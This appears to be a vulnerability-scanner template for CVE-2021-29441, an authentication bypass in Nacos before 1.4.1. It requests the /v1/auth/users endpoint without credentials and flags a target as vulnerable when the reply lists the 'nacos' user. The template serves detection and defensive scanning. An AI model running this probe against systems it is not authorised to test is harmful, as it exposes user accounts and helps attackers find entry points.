id: CVE-2021-29441
info:
  name: Nacos <1.4.1 - Authentication Bypass
  severity: high
  tags: nacos

requests:
  - method: GET
    path:
      - "{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=100"
      - "{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=100"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"username":"nacos"'
        part: body